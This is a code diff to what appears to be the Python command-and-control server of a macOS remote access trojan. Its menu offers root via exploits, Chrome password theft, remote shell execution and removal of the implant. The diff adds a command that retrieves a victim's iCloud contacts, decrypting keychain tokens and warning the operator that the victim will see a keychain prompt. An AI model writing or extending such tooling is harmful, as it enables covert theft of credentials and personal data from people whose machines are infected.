@@ -20,7 +20,7 @@ MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name",
-            "get_shell_info", "get_chrome_passwords", "kill_client"]
+            "get_shell_info", "get_chrome_passwords", "get_icloud_contacts", "kill_client"]
 status_messages = []
 
 # The ID of the client is it's place in the array
@@ -36,6 +36,7 @@ def print_help():
     print "get_info             -  Show basic information about the client."
     print "get_root             -  Attempt to get root via exploits."
     print "get_chrome_passwords -  Attempt to retrieve Chrome passwords."
+    print "get_icloud_contacts  -  Attempt to retrieve iCloud contacts."
     print "kill_client          -  Brutally kill the client (removes the server)."
     print "Any other command will be executed on the connected client."
 
@@ -175,6 +176,24 @@ if __name__ == '__main__':
 
                             if not confirm or confirm.lower() == "y":
                                 print send_command(connections[current_client_id], "get_chrome_passwords")
+                        elif command == "get_icloud_contacts":
+                            response = send_command(connections[current_client_id], "get_icloud_contacts")
+
+                            if "Failed to find" in response:  # Failed to find tokens.json
+                                # Create tokens.json, warn that it may prompt the user.
+                                print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
+                                confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")
+
+                                if not confirm or confirm.lower() == "y":
+                                    decrypt_response = send_command(connections[current_client_id], "decrypt_mme")
+
+                                    if "Failed" in decrypt_response:
+                                        print decrypt_response
+                                    else:
+                                        # Send get_icloud_contacts again, should be successful this time.
+                                        print send_command(connections[current_client_id], "get_icloud_contacts")
+                            else:
+                                print response
                         elif command == "kill_client":
                             print MESSAGE_INFO + "Removing server..."
                             response = send_command(connections[current_client_id], "kill_client")
@@ -193,7 +212,7 @@ if __name__ == '__main__':
                 else:
                     response = base64.b64decode(send_command(connections[current_client_id], command))
 
-                    if command.startswith("cd"):
+                    if command.startswith("cd"):  # Commands that have no output.
                         pass
                     elif response == "EMPTY":
                         print MESSAGE_ATTENTION + "No command output."
